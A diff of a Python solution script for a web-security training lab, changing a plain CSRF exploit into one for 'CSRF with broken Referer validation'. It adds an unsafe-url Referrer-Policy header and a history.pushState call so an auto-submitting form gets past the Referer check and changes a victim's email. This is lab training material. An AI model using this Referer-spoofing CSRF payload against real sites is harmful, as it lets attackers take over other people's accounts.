@@ -1,16 +1,18 @@
-##############################################################################################
+##################################################################################################
 #
 # Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 21/10/2023
 #
-# Lab: CSRF vulnerability with no defenses
+# Lab: CSRF with broken Referer validation
 #
-# Steps: 1. Craft an HTML form for changing the email address with an auto-submit script
-#        2. Deliver the exploit to the victim
-#        3. The victim's email will be changed after he trigger the exploit
+# Steps: 1. Add the `Referrer-Policy` header to your exploit server response headers
+#        2. Craft an HTML form for changing the email address with an auto-submit 
+#           script that changes the Referer header value using the history.pushState() method
+#        3. Deliver the exploit to the victim
+#        4. The victim's email will be changed after he trigger the exploit
 #
-##############################################################################################
+##################################################################################################
 
 
 ###########
@@ -19,19 +21,18 @@
 import requests
 from colorama import Fore
 
-
 #########
 # Main
 #########
 
 # change this to your lab URL
-lab_url = "https://0ac300660457354a80fdc17d008e000f.web-security-academy.net"
+lab_url = "https://0ad000ed034517b4843abe97001e00e6.web-security-academy.net"
 
 # change this to your exploit server URL
-exploit_server_url = "https://exploit-0a7e00bd04a235f880eac08e019d00ff.exploit-server.net"
+exploit_server_url = "https://exploit-0ab3000a03ae17f68419bdf9017e007b.exploit-server.net"
 
 # the header of your exploit sever response
-exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
+exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nReferrer-Policy: unsafe-url"
     
 # the new email
 # you can change this to what you want
@@ -45,6 +46,7 @@ payload = f"""<html>
                     <input type="submit" value="Submit request" />
                 </form>
                 <script>
+                    history.pushState('', '', '/?{lab_url}');
                     document.forms[0].submit();
                 </script>
                 </body>
